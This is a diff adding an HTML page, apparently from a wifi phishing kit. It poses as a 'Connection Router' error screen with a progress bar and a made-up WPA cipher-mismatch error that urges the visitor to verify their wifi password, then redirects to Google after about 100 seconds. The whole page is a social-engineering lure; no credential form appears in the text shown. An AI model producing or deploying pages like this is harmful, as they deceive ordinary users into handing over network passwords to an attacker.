@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Error</title>
+	<style>
+	body{
+		margin: 0px;
+		padding: 0px;
+	}
+	.pos{
+			margin-top: 30px;
+			margin-left: auto;
+			margin-right: auto;
+			width: 720px;
+			background-color: ;
+	}
+	.sec{
+		font-size: 38px;
+		margin-bottom: 2px;
+	}
+	.pross{
+		margin-top: 40px;
+		width: 350px;
+		margin-left: auto;
+		margin-right: auto;
+		padding: 15px 15px 15px 15px;
+		border-radius: 5px;
+	}
+	#myProgress {
+  width: 100%;
+  background-color: #ddd;
+}
+#myBar {
+  width: 1%;
+  height: 20px;
+  background-color: #4CAF50;
+}
+	.not{
+		margin-top: 70px;
+	}
+
+@media only screen and (max-width: 750px) {
+    body {
+        backgr-ound-color: lightgreen;
+        margin: 0px;
+		padding: 0px;
+    }
+    .pos{
+			margin-top: 30px;
+			margin-left: auto;
+			margin-right: auto;
+			width: 700px;
+			background-color: ;
+	}
+	.pross{
+		width: 350px;
+		margin-left: auto;
+		margin-right: auto;
+		padding: 15px 15px 15px 15px;
+		border-radius: 5px;
+	}
+}
+@media only screen and (max-width: 500px) {
+    body {
+        backgr-ound-color: lightblue;
+        margin: 0px;
+		padding: 0px;
+	}
+	.pos{
+			margin-top: 30px;
+			margin-left: auto;
+			margin-right: auto;
+			width: 420px;
+			background-color: ;
+	}
+	.pross{
+		width: 350px;
+		margin-left: auto;
+		margin-right: auto;
+		padding: 15px 15px 15px 15px;
+		border-radius: 5px;
+	}
+}
+
+	</style>
+</head>
+<body>
+	<div class="pos">
+	<p class="sec">Connection Router</p>
+	<hr>
+	<div class="pross">
+		<h3>Please Wait..</h3>
+		<div id="myProgress">
+            <div id="myBar"></div>
+        </div>
+        <p>Do not try to open any webpage untill finished.</p>
+        <script>
+function move() {
+  var elem = document.getElementById("myBar");   
+  var width = 1;
+  var id = setInterval(frame, 1000);
+  function frame() {
+    if (width >= 100) {
+      clearInterval(id);
+      window.location.assign("https://www.google.com")
+    } else {
+      width++; 
+      elem.style.width = width + '%'; 
+    }
+  }
+}
+move()
+</script>
+	</div>
+	<p class="not">
+		Note: <br>
+		An error occured during a connection to the router. <br>
+		Cannot communicate securely with wifi password: no common encryption algorithm(s). (Error code: <b>wpa_password_error_no_cypher_match</b>).
+		<ul>
+			<li>The page you trying to view cannot be show because the <b>WPA</b> authenticity with the router could not be verified.</li>
+			<li>Please contact the product manager to inform this problem.</li>
+			<li>Verify your wifi password.</li>
+		</ul>
+	</p>
+    </div>
+</body>
+</html>
